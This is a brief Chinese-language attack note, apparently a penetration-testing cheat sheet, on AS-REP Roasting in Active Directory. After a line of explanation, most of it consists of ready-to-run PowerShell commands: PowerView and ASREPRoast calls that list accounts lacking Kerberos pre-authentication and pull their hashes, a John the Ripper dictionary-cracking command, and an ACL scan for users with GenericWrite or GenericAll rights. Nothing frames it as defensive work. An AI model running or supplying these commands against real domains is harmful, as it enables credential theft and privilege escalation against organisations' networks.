# AS-REP Roasting攻击

AS-REP Roasting攻击的原理就是通过获取不需要kerberos身份验证的高权限账户，获取器hash值，进行爆破。这个爆破是依靠字典的，限制较多，不是很好用，首先控制一台域内的机器，然后获取powershell的权限。

[ASREPRoast工具](https://github.com/gold1029/ASREPRoast)

```powershell
# 获取不需要kerberos身份验证的高权限账户
. .\PowerView_dev.ps1
Get-DomainUser -PreauthNotRequired -Verbose
Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose   # 获取用户名

# 获取hash
. .\ASREPRoast\ASREPRoast.ps1
Get-ASREPHash -UserName 用户名 -Verbose

# 使用john破解密码
./john vpnxuser.txt --wordlist=wordlist.txt
```

```powershell
# 列举那些studentx拥有GenericWrite或GenericAll权限的用户
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

```
